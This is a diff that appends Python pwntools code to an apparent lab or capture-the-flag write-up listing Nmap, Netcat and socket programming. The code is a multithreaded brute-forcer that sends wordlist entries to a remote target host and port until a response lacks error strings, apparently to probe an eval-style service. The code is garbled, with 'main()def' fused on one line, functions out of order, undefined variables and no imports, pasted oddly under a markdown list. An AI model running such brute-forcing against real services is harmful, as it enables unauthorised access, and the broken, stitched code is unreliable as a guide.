@@ -121,4 +121,40 @@ The difference between simply running tools and understanding protocol-level beh
 
 - Nmap  
 - Netcat  
-- Python (socket programming)  
+- Python (socket programming)
+
+def main():
+    with open(wordlist, 'r', encoding='latin1', errors='ignore') as f:
+        passwords = [line.strip() for line in f.readlines()]
+    passwords_length = len(passwords)
+    step = (passwords_length + num_threads - 1) // num_threads
+    threads = []
+    for i in range(num_threads):
+        start = i * step
+        end = min(start + step, passwords_length)
+        if start < passwords_length:
+            thread = threading.Thread(target=brute_force_input, args=(passwords[start:end],))
+            threads.append(thread)
+            thread.start()
+    for thread in threads:
+        thread.join()
+
+if __name__ == '__main__':
+    main()def brute_force_input(words):
+    context.log_level = "error"
+    r = remote(target_ip, target_port)
+    for word in words:
+        if stop_flag.is_set():
+            r.close()
+            return
+        r.sendline(word.encode())
+        output = r.recvline()
+        print(f'Tested: {word}, Output: {output}')  # Add this line to log the output
+        if b'not defined' not in output and b'<string>' not in output and output != b'\n':
+            stop_flag.set()
+            print(f"[+] Input found: {word}")
+            print(f"[+] Output received: {output}")
+            r.close()
+            return
+    r.close()
+    return
